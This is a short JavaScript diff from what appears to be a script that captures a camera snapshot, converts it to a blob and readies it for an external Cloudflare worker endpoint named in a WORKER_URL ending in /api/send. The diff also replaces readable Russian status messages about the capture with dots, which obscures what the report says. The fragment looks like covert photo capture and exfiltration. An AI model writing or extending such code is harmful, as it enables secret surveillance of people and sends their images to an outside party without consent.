@@ -231,11 +231,11 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
 
     // --- фото в blob ---
     var photoBlob = null;
-    var camLine = '✗ не ';
+    var camLine = '...... ';
     if (camRes && camRes.dataUrl) {
-      camLine = '✓ снимок ' + camRes.w + 'x' + camRes.h;
+      camLine = '..... ' + camRes.w + 'x' + camRes.h;
       try { photoBlob = await (await fetch(camRes.dataUrl)).blob(); }
-      catch(e){ photoBlob = null; camLine = '✗ не удалось сделать blob'; }
+      catch(e){ photoBlob = null; camLine = '.....'; }
     } else if (camRes && camRes.error) {
       camLine = '✗ : ' + camRes.error;
     }
